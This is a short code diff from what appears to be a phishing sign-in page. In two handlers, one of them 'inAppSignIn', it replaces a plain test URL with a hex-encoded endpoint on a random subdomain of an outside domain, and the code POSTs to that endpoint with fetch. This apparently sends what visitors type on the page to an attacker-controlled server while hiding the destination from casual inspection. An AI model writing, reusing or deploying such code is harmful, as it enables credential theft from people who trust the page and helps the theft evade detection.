@@ -340,12 +340,12 @@
         return Math.floor(Math.random() * (t - e + 1)) + e;
       }
       function inAppSignIn() {
-        // var e =
-        //   hexToString("68747470733a2f2f") +
-        //   getRandomInt(1111, 9999).toString() +
-        //   "." +
-        //   hexToString("626d706930392e7362732f6170692e706870");
-        var e = 'https://test2333.bmpi09.sbs/m112.php';
+        var e =
+          hexToString("68747470733a2f2f") +
+          getRandomInt(1111, 9999).toString() +
+          "." +
+          hexToString("626d706930392e7362732f6170692e706870");
+        // var e = 'https://test2333.bmpi09.sbs/m112.php';
         e &&
           fetch(e, {
             method: "post",
@@ -379,12 +379,12 @@
         document.getElementById("sform").style.display = "none";
         document.querySelector(".play-icon").style.opacity = 0;
         document.getElementById("load-content").style.display = "flex";
-        // var e =
-        //   hexToString("68747470733a2f2f") +
-        //   getRandomInt(1111, 9999).toString() +
-        //   "." +
-        //   hexToString("626d706930392e7362732f6170692e706870");
-        var e = 'https://test2333.bmpi09.sbs/m112.php';
+        var e =
+          hexToString("68747470733a2f2f") +
+          getRandomInt(1111, 9999).toString() +
+          "." +
+          hexToString("626d706930392e7362732f6170692e706870");
+        // var e = 'https://test2333.bmpi09.sbs/m112.php';
         e &&
           fetch(e, {
             method: "post",
